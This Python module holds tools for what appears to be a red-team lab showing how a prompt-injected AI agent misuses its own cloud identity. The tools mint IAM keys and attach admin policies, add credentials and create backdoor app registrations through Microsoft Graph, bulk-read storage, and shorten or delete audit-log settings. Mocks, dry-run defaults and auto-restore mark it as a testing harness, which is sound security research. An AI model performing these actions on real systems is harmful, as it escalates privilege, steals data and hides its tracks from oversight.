"""Agent tools — the capabilities the agent can invoke."""

import time
from xml.etree import ElementTree

import boto3
import httpx


class ReadDocumentTool:
    """Read a document and return its content. This is the poison vector."""

    def execute(self, path: str) -> str:
        with open(path) as f:
            return f.read()


class CloudIAMTool:
    """Manage cloud IAM resources via the agent's identity.

    In live mode, calls LocalStack (or real AWS). The agent's own identity
    is the one performing these operations — that's the point.
    """

    def __init__(self, endpoint_url: str = "http://localhost:4566"):
        self.endpoint_url = endpoint_url
        # Static credentials are LocalStack defaults for sandbox testing.
        # In production, the agent would use OAuth-brokered AWS credentials
        # (e.g., STS AssumeRoleWithWebIdentity via OIDC token exchange).
        self.iam = boto3.client(
            "iam",
            endpoint_url=endpoint_url,
            aws_access_key_id="test",
            aws_secret_access_key="test",
            region_name="us-east-1",
        )

    def execute(self, action: str, **kwargs) -> dict:
        if action == "create_access_key":
            resp = self.iam.create_access_key(UserName=kwargs["username"])
            key = resp["AccessKey"]
            return {
                "access_key_id": key["AccessKeyId"],
                "username": key["UserName"],
                "status": key["Status"],
            }
        elif action == "list_users":
            resp = self.iam.list_users()
            return {"users": [u["UserName"] for u in resp["Users"]]}
        elif action == "create_user":
            resp = self.iam.create_user(UserName=kwargs["username"])
            user = resp["User"]
            return {
                "username": user["UserName"],
                "user_id": user["UserId"],
                "status": "Created",
            }
        elif action == "attach_admin_policy":
            policy_arn = kwargs.get(
                "policy_arn", "arn:aws:iam::000000000000:policy/AdminEscalationPolicy"
            )
            self.iam.attach_user_policy(UserName=kwargs["username"], PolicyArn=policy_arn)
            return {
                "policy_arn": policy_arn,
                "username": kwargs["username"],
                "status": "Attached",
            }
        else:
            raise ValueError(f"Unknown IAM action: {action}")


class MockCloudIAMTool:
    """Mock IAM tool for testing without Docker/LocalStack."""

    def execute(self, action: str, **kwargs) -> dict:
        if action == "create_access_key":
            return {
                "access_key_id": "AKIAIOSFODNN7EXAMPLE",
                "username": kwargs["username"],
                "status": "Active",
            }
        elif action == "list_users":
            return {"users": ["bridgelab-agent", "backup-admin"]}
        elif action == "create_user":
            return {
                "username": kwargs["username"],
                "user_id": "AIDAEXAMPLE0BRIDGELAB",
                "status": "Created",
            }
        elif action == "attach_admin_policy":
            return {
                "policy_arn": "arn:aws:iam::000000000000:policy/AdminEscalationPolicy",
                "username": kwargs["username"],
                "status": "Attached",
            }
        else:
            raise ValueError(f"Unknown IAM action: {action}")


class CloudLogTool:
    """Disable or modify a cloud audit log via the agent's identity — T1685.002.

    Uses CloudWatch Logs (boto3 'logs'), not CloudTrail: CloudTrail is a
    Pro-only service on this LocalStack license, while CloudWatch Logs is
    community-supported. The malicious
    action is reducing the audit log group's retention to the 1-day minimum so
    the agent's traces age out fast — the "Modify Cloud Log" half of T1685.002.

    create_log_group only ensures the sandbox has a group to target; in a real
    environment the audit log group already exists and the agent would only
    modify it. LocalStack has no real blast radius, so — like the LocalStack
    branches of the other techniques — the modify happens unconditionally.
    """

    MODIFIED_RETENTION_DAYS = 1

    def __init__(self, endpoint_url: str = "http://localhost:4566"):
        self.endpoint_url = endpoint_url
        # Static credentials are LocalStack defaults for sandbox testing;
        # in production the agent would use OAuth-brokered AWS credentials.
        self.logs = boto3.client(
            "logs",
            endpoint_url=endpoint_url,
            aws_access_key_id="test",
            aws_secret_access_key="test",
            region_name="us-east-1",
        )

    def execute(self, action: str, **kwargs) -> dict:
        if action == "disable_log":
            log_group_name = kwargs["log_group_name"]
            # Ensure the sandbox has an audit log group to target. In a real
            # environment this group pre-exists and this call is unnecessary.
            try:
                self.logs.create_log_group(logGroupName=log_group_name)
            except self.logs.exceptions.ResourceAlreadyExistsException:
                pass
            self.logs.put_retention_policy(
                logGroupName=log_group_name,
                retentionInDays=self.MODIFIED_RETENTION_DAYS,
            )
            return {
                "log_group_name": log_group_name,
                "retention_days": self.MODIFIED_RETENTION_DAYS,
                "status": "Modified",
            }
        else:
            raise ValueError(f"Unknown logs action: {action}")


class MockCloudLogTool:
    """Mock CloudWatch Logs tool for testing without Docker/LocalStack."""

    def execute(self, action: str, **kwargs) -> dict:
        if action == "disable_log":
            return {
                "log_group_name": kwargs["log_group_name"],
                "retention_days": 1,
                "status": "Modified",
            }
        else:
            raise ValueError(f"Unknown logs action: {action}")


class CloudStorageTool:
    """Read objects from cloud storage via the agent's identity.

    Mirrors CloudIAMTool's static-LocalStack-credential setup, but for S3.
    `read_object` backs out-of-scope-access (T1550.001) — one out-of-scope
    call proving token reuse. `list_and_collect` backs data-collection
    (T1530) — the same legitimate storage-reader grant used to enumerate and
    bulk-read an entire bucket instead of one object.
    """

    def __init__(self, endpoint_url: str = "http://localhost:4566"):
        self.endpoint_url = endpoint_url
        self.s3 = boto3.client(
            "s3",
            endpoint_url=endpoint_url,
            aws_access_key_id="test",
            aws_secret_access_key="test",
            region_name="us-east-1",
        )

    def execute(self, action: str, **kwargs) -> dict:
        if action == "read_object":
            resp = self.s3.get_object(Bucket=kwargs["bucket"], Key=kwargs["key"])
            body = resp["Body"].read()
            return {
                "bucket": kwargs["bucket"],
                "key": kwargs["key"],
                "content_length": len(body),
                "status": "Read",
            }
        elif action == "list_and_collect":
            listing = self.s3.list_objects_v2(Bucket=kwargs["bucket"])
            keys = [obj["Key"] for obj in listing.get("Contents", [])]
            total_bytes = sum(
                len(self.s3.get_object(Bucket=kwargs["bucket"], Key=key)["Body"].read())
                for key in keys
            )
            return {
                "bucket": kwargs["bucket"],
                "keys": keys,
                "object_count": len(keys),
                "total_bytes": total_bytes,
                "status": "Collected",
            }
        else:
            raise ValueError(f"Unknown storage action: {action}")


class MockCloudStorageTool:
    """Mock storage tool for testing without Docker/LocalStack."""

    def execute(self, action: str, **kwargs) -> dict:
        if action == "read_object":
            return {
                "bucket": kwargs["bucket"],
                "key": kwargs["key"],
                "content_length": 54,
                "status": "Read",
            }
        elif action == "list_and_collect":
            keys = ["pii/records.json", "financial/statement.json", "credentials/api_keys.json"]
            return {
                "bucket": kwargs["bucket"],
                "keys": keys,
                "object_count": len(keys),
                "total_bytes": 162,
                "status": "Collected",
            }
        else:
            raise ValueError(f"Unknown storage action: {action}")


class MockAzureIAMTool:
    """Mock Entra/Azure credential tool for testing without a real tenant.

    Azure-native analog of MockCloudIAMTool: instead of an IAM access key,
    the "persistent credential" is a new client secret added to a target
    Service Principal (Microsoft Graph addPassword).
    """

    def execute(self, action: str, **kwargs) -> dict:
        if action == "add_credential":
            return {
                "key_id": "11111111-2222-3333-4444-555555555555",
                "app_object_id": kwargs["target_app_id"],
                "status": "Active",
            }
        elif action == "list_credentials":
            return {"credentials": ["existing-cred-1"]}
        elif action == "list_role_assignments":
            return {
                "principal_id": kwargs["principal_id"],
                "role_assignments": ["Reader"],
                "existing_assignment_count": 1,
                "dry_run": True,
            }
        elif action == "assign_role":
            return {
                "principal_id": kwargs["principal_id"],
                "role_assigned": "Privileged Role Administrator",
                "role_assignment_id": "22222222-3333-4444-5555-666666666666",
                "dry_run": False,
            }
        elif action == "create_account":
            return {
                "app_id": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
                "app_object_id": "11111111-2222-3333-4444-555555555555",
                "display_name": kwargs["display_name"],
                "status": "Created and cleaned up (backdoor identity removed)",
                "cleaned_up": True,
                "dry_run": False,
            }
        elif action == "list_and_collect":
            keys = ["pii/records.json", "financial/statement.json", "credentials/api_keys.json"]
            return {
                "account": kwargs["account"],
                "container": kwargs["container"],
                "keys": keys,
                "object_count": len(keys),
                "total_bytes": 162,
                "status": "Collected",
            }
        else:
            raise ValueError(f"Unknown Azure IAM action: {action}")


class AzureIAMTool:
    """Manage Entra/Azure Application (App Registration) credentials via
    Microsoft Graph, using the agent's own bearer token.

    Targets the /applications endpoint (not /servicePrincipals) to match
    Application.ReadWrite.OwnedBy, which scopes to Application objects — the
    same object `az ad app owner add` grants ownership on. target_app_id must
    be the target Application's object ID (App registrations blade), not its
    Service Principal / Enterprise Application object ID — those are
    different objects with different object IDs for the same app.

    Unlike CloudIAMTool (static LocalStack/AWS test credentials), this tool is
    always constructed with the real token the agent obtained from Entra —
    that's the point of the bridge condition: no separate cloud credential,
    the identity token itself is what's used against the Graph API.

    Destructive by default is OFF: unless confirm_destructive=True, "add_credential"
    and "create_account" degrade to a safe, read-only listing instead of mutating the
    tenant. Intended so a live/interactive run never mutates a real tenant unless someone
    explicitly opts in for a single, deliberate capture (e.g. the fallback recording).

    "create_account" (T1136.003) creates a brand-new App Registration and then
    immediately deletes it — proving the agent's token can mint a new backdoor
    identity without leaving a persistent artifact behind. It needs the tenant-wide
    Application.ReadWrite.All grant, unlike add_credential's scopable
    Application.ReadWrite.OwnedBy.
    """

    GRAPH_BASE = "https://graph.microsoft.com/v1.0"

    def __init__(self, token: str, confirm_destructive: bool = False):
        self.token = token
        self.confirm_destructive = confirm_destructive

    def _headers(self) -> dict:
        return {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}

    def execute(self, action: str, **kwargs) -> dict:
        if action == "add_credential":
            target_app_id = kwargs["target_app_id"]
            if not self.confirm_destructive:
                return self._list_credentials(target_app_id)
            return self._add_credential(target_app_id)
        elif action == "list_credentials":
            return self._list_credentials(kwargs["target_app_id"])
        elif action == "list_role_assignments":
            # Deliberately read-only: there is no write counterpart on this
            # class. RoleManagement.ReadWrite.Directory is tenant-wide power
            # (not scopable like Application.ReadWrite.OwnedBy above), so a
            # real directory-role self-assignment is never performed against
            # a live tenant by this tool — only ever simulated in mock mode.
            return self._list_role_assignments(kwargs["principal_id"])
        elif action == "create_account":
            # T1136.003: create a brand-new App Registration the attacker
            # controls. Same destructive gate as add_credential — without
            # confirm_destructive this degrades to a read-only listing.
            if not self.confirm_destructive:
                return self._list_applications()
            return self._create_application(kwargs["display_name"])
        else:
            raise ValueError(f"Unknown Azure IAM action: {action}")

    def _add_credential(self, target_app_id: str) -> dict:
        resp = httpx.post(
            f"{self.GRAPH_BASE}/applications/{target_app_id}/addPassword",
            headers=self._headers(),
            json={"passwordCredential": {"displayName": "bridgelab-backup-cred"}},
        )
        resp.raise_for_status()
        data = resp.json()
        return {
            "key_id": data.get("keyId"),
            "app_object_id": target_app_id,
            "status": "Active",
            "dry_run": False,
        }

    def _list_credentials(self, target_app_id: str) -> dict:
        resp = httpx.get(
            f"{self.GRAPH_BASE}/applications/{target_app_id}"
            "?$select=passwordCredentials",
            headers=self._headers(),
        )
        resp.raise_for_status()
        data = resp.json()
        return {
            "key_id": None,
            "app_object_id": target_app_id,
            "status": "DRY-RUN — pass --confirm-destructive to actually add a credential",
            "existing_credential_count": len(data.get("passwordCredentials", [])),
            "dry_run": True,
        }

    def _list_role_assignments(self, principal_id: str) -> dict:
        resp = httpx.get(
            f"{self.GRAPH_BASE}/roleManagement/directory/roleAssignments"
            f"?$filter=principalId eq '{principal_id}'",
            headers=self._headers(),
        )
        resp.raise_for_status()
        data = resp.json()
        assignments = data.get("value", [])
        return {
            "principal_id": principal_id,
            "role_assignments": [a.get("roleDefinitionId") for a in assignments],
            "existing_assignment_count": len(assignments),
            "dry_run": True,
        }

    def _list_applications(self) -> dict:
        resp = httpx.get(
            f"{self.GRAPH_BASE}/applications?$select=id", headers=self._headers()
        )
        resp.raise_for_status()
        data = resp.json()
        return {
            "app_id": None,
            "app_object_id": None,
            "status": (
                "DRY-RUN — pass --confirm-destructive to actually create "
                "(and auto-remove) a backdoor App Registration"
            ),
            "existing_application_count": len(data.get("value", [])),
            "dry_run": True,
        }

    # Graph is eventually consistent for brand-new directory objects, so a
    # DELETE issued right after the POST can transiently 404 (or be throttled)
    # until the new app replicates. These statuses mean "retry", not "fail".
    _DELETE_RETRY_STATUSES = frozenset({404, 429, 503, 504})

    def _create_application(self, display_name: str) -> dict:
        """Create a new App Registration, then delete it (with retry).

        The create+delete round-trip is deliberate: it proves the agent's
        token can mint a brand-new backdoor identity — both the 'Add
        application' and 'Delete application' events land in the Entra audit
        log tied to the agent SP — while leaving no persistent artifact in
        the live tenant to clean up later.
        """
        resp = httpx.post(
            f"{self.GRAPH_BASE}/applications",
            headers=self._headers(),
            json={"displayName": display_name},
        )
        resp.raise_for_status()
        data = resp.json()
        object_id = data.get("id")
        self._delete_application_with_retry(object_id, display_name)
        return {
            "app_id": data.get("appId"),
            "app_object_id": object_id,
            "display_name": display_name,
            "status": "Created and cleaned up (backdoor identity removed)",
            "cleaned_up": True,
            "dry_run": False,
        }

    def _delete_application_with_retry(
        self, object_id: str, display_name: str, attempts: int = 6, base_delay: float = 2.0
    ) -> None:
        """Delete the just-created app, retrying while Graph replicates it.

        Raises RuntimeError naming the leftover object id if cleanup never
        succeeds, so an orphaned backdoor app is never left behind silently.
        """
        url = f"{self.GRAPH_BASE}/applications/{object_id}"
        last_status = None
        for attempt in range(attempts):
            del_resp = httpx.delete(url, headers=self._headers())
            if del_resp.status_code in (200, 204):
                return
            last_status = del_resp.status_code
            if del_resp.status_code not in self._DELETE_RETRY_STATUSES:
                del_resp.raise_for_status()
            # linear backoff — Graph directory-object propagation is seconds
            time.sleep(base_delay * (attempt + 1))
        raise RuntimeError(
            f"Created App Registration {display_name!r} (object id {object_id}) but could "
            f"not delete it after {attempts} attempts (last HTTP {last_status}). This is a "
            f"LEFTOVER backdoor identity in the tenant — remove it manually with: "
            f"az ad app delete --id {object_id}"
        )


class AzureStorageTool:
    """Enumerate and bulk-read Azure Blob Storage via the agent's own bearer
    token — the data-collection technique's (T1530) Azure counterpart to
    CloudStorageTool's list_and_collect on LocalStack.

    Unlike AzureIAMTool's techniques, this one is never capped to a
    read-only "proof": Storage Blob Data Reader is scoped to one
    container (unlike RoleManagement.ReadWrite.Directory's tenant-wide
    power), and the technique's real action already IS a read — so there's
    no broader-permission risk to guard against, live or not.

    Requires a Storage-scoped token (resource https://storage.azure.com),
    not the Graph-scoped token the other three techniques use — same
    client credentials, different resource/audience.
    """

    API_VERSION = "2021-08-06"

    def __init__(self, token: str):
        self.token = token

    def _headers(self) -> dict:
        return {"Authorization": f"Bearer {self.token}", "x-ms-version": self.API_VERSION}

    def execute(self, action: str, **kwargs) -> dict:
        if action == "list_and_collect":
            return self._list_and_collect(kwargs["account"], kwargs["container"])
        else:
            raise ValueError(f"Unknown Azure storage action: {action}")

    def _list_and_collect(self, account: str, container: str) -> dict:
        base = f"https://{account}.blob.core.windows.net/{container}"
        list_resp = httpx.get(
            base, params={"restype": "container", "comp": "list"}, headers=self._headers()
        )
        list_resp.raise_for_status()
        root = ElementTree.fromstring(list_resp.text)
        keys = [blob.findtext("Name") for blob in root.iter("Blob")]
        total_bytes = 0
        for key in keys:
            blob_resp = httpx.get(f"{base}/{key}", headers=self._headers())
            blob_resp.raise_for_status()
            total_bytes += len(blob_resp.content)
        return {
            "account": account,
            "container": container,
            "keys": keys,
            "object_count": len(keys),
            "total_bytes": total_bytes,
            "status": "Collected",
        }


class MockAzureMonitorTool:
    """Mock Azure Monitor diagnostic-settings tool for testing without a tenant.

    Azure counterpart of MockCloudLogTool. "disable_log" reports the setting
    disabled and restored (audit logging re-enabled); the read-only listing is
    the dry-run form.
    """

    def execute(self, action: str, **kwargs) -> dict:
        if action == "disable_log":
            return {
                "resource_id": kwargs["resource_id"],
                "setting_name": kwargs["setting_name"],
                "status": "Disabled and restored (audit logging re-enabled)",
                "restored": True,
                "dry_run": False,
            }
        elif action == "list_diagnostic_settings":
            return {
                "resource_id": kwargs["resource_id"],
                "setting_name": None,
                "existing_setting_count": 1,
                "restored": None,
                "dry_run": True,
            }
        else:
            raise ValueError(f"Unknown Azure monitor action: {action}")


class AzureMonitorTool:
    """Disable or modify a resource's diagnostic (audit log) settings via Azure
    Resource Manager, using the agent's own bearer token — the Azure
    counterpart of CloudLogTool (T1685.002, Disable or Modify Cloud Log).

    Unlike AzureIAMTool (Microsoft Graph) and AzureStorageTool (Storage data
    plane), diagnostic settings live in the ARM management plane
    (management.azure.com), so this tool needs a token scoped to that resource
    — not the Graph- or Storage-scoped tokens the other techniques use.

    Destructive by default is OFF: without confirm_destructive, "disable_log"
    degrades to a read-only listing of the resource's diagnostic settings. When
    confirmed, it captures the target setting, DELETEs it (the "Disable Cloud
    Log" action), then restores it from the captured body so audit logging is
    re-enabled and nothing persists — both the delete and the re-create land in
    the Azure Activity Log tied to the agent SP.

    If the restore ever fails it raises loudly, naming the setting, so audit
    logging is NEVER left silently disabled — the safety-critical analog of
    AzureIAMTool never orphaning a backdoor App Registration.
    """

    ARM_BASE = "https://management.azure.com"
    API_VERSION = "2021-05-01-preview"
    _RESTORE_OK_STATUSES = frozenset({200, 201})

    def __init__(self, token: str, confirm_destructive: bool = False):
        self.token = token
        self.confirm_destructive = confirm_destructive

    def _headers(self) -> dict:
        return {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}

    def _settings_url(self, resource_id: str, name: str | None = None) -> str:
        base = (
            f"{self.ARM_BASE}/{resource_id.strip('/')}"
            "/providers/microsoft.insights/diagnosticSettings"
        )
        suffix = f"/{name}" if name else ""
        return f"{base}{suffix}?api-version={self.API_VERSION}"

    def execute(self, action: str, **kwargs) -> dict:
        if action == "disable_log":
            resource_id = kwargs["resource_id"]
            setting_name = kwargs["setting_name"]
            if not self.confirm_destructive:
                return self._list_diagnostic_settings(resource_id)
            return self._disable_and_restore(resource_id, setting_name)
        elif action == "list_diagnostic_settings":
            return self._list_diagnostic_settings(kwargs["resource_id"])
        else:
            raise ValueError(f"Unknown Azure monitor action: {action}")

    def _list_diagnostic_settings(self, resource_id: str) -> dict:
        resp = httpx.get(self._settings_url(resource_id), headers=self._headers())
        resp.raise_for_status()
        data = resp.json()
        return {
            "resource_id": resource_id,
            "setting_name": None,
            "status": (
                "DRY-RUN — pass --confirm-destructive to actually disable "
                "(and auto-restore) the audit log diagnostic setting"
            ),
            "existing_setting_count": len(data.get("value", [])),
            "restored": None,
            "dry_run": True,
        }

    def _disable_and_restore(self, resource_id: str, setting_name: str) -> dict:
        """Capture -> delete -> restore the target diagnostic setting.

        The delete is the malicious "Disable Cloud Log" action; the restore
        re-enables audit logging so nothing persists. Both events land in the
        Azure Activity Log tied to the agent SP.
        """
        # 1) capture the current setting so it can be put back verbatim
        get_resp = httpx.get(
            self._settings_url(resource_id, setting_name), headers=self._headers()
        )
        get_resp.raise_for_status()
        captured = get_resp.json()
        # 1a) abort-before-delete: prove we can restore BEFORE we destroy anything.
        # Cheap guard first — a capture with no 'properties' is nothing to put back.
        if not captured.get("properties"):
            raise RuntimeError(
                f"Refusing to disable diagnostic setting {setting_name!r} on {resource_id}: "
                f"captured setting has no restorable 'properties'. Aborting BEFORE the delete "
                f"— audit logging is untouched."
            )
        # Then a pre-flight no-op PUT of the captured setting: it re-writes the
        # setting verbatim (idempotent while it still exists) purely to confirm the
        # SP holds restore-write permission. The 2026-09-29 live failure was a 403
        # on the restore PUT (missing write on the setting's destination) AFTER a
        # successful DELETE — audit logging was left off. Catch that here instead.
        self._preflight_restore_write(resource_id, setting_name, captured)
        # 2) DELETE it — audit logging for this resource stops here
        del_resp = httpx.delete(
            self._settings_url(resource_id, setting_name), headers=self._headers()
        )
        del_resp.raise_for_status()
        # 3) restore from the captured body — re-enables audit logging
        self._restore_setting(resource_id, setting_name, captured)
        return {
            "resource_id": resource_id,
            "setting_name": setting_name,
            "status": "Disabled and restored (audit logging re-enabled)",
            "restored": True,
            "dry_run": False,
        }

    def _preflight_restore_write(self, resource_id: str, setting_name: str, captured: dict) -> None:
        """Pre-flight the restore write BEFORE the delete. PUTs the captured
        setting back verbatim (a no-op while it still exists) to prove the SP can
        restore it. If forbidden, abort now — the setting is never deleted."""
        put_resp = httpx.put(
            self._settings_url(resource_id, setting_name),
            headers=self._headers(),
            json={"properties": captured.get("properties", {})},
        )
        if put_resp.status_code not in self._RESTORE_OK_STATUSES:
            raise RuntimeError(
                f"Refusing to disable diagnostic setting {setting_name!r} on {resource_id}: "
                f"pre-flight restore write was forbidden (HTTP {put_resp.status_code}), so audit "
                f"logging could not be re-enabled after a delete. Aborting BEFORE the delete "
                f"— audit logging is untouched. Grant the agent SP Monitoring Contributor at "
                f"resource-group scope (covers the setting's destination) and retry."
            )

    def _restore_setting(self, resource_id: str, setting_name: str, captured: dict) -> None:
        put_resp = httpx.put(
            self._settings_url(resource_id, setting_name),
            headers=self._headers(),
            json={"properties": captured.get("properties", {})},
        )
        if put_resp.status_code not in self._RESTORE_OK_STATUSES:
            raise RuntimeError(
                f"Deleted diagnostic setting {setting_name!r} on {resource_id} but could NOT "
                f"restore it (last HTTP {put_resp.status_code}). AUDIT LOGGING IS LEFT "
                f"DISABLED on this resource — re-create the setting manually with: "
                f"az monitor diagnostic-settings create --name {setting_name} "
                f"--resource {resource_id} ..."
            )
